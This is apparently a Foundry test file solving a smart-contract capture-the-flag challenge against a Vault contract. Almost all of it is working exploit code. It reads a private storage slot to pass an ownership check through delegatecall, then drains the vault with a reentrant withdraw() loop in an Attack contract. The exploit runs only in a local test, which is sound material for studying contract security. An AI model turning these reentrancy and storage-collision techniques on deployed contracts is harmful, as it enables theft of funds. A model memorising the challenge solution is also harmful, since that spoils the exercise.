// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attack {
    Vault vault;
    constructor(address _vault) {
        vault = Vault(payable(_vault));
    }
    function attack() public payable {
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
    }
    receive() external payable {
        if (address(vault).balance > 0 ether) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        // add your hacker code.
        // 读取 Vault 合约 1 号插槽的数据（logic 合约地址）
        bytes32 slot1Data = vm.load(address(vault), bytes32(uint256(1)));
        // address logicAddress = address(uint160(uint256(slot1Data)));
        // console2.log("Logic contract address from slot 1:", logicAddress);
        // console2.log("addr ", address(logic));

        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            slot1Data,
            palyer
        );
        (bool success, ) = address(vault).call(data);
        require(success, "changeOwner failed");
        vault.openWithdraw();

        Attack attack = new Attack(address(vault));
        attack.attack{value: 0.1 ether}();
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
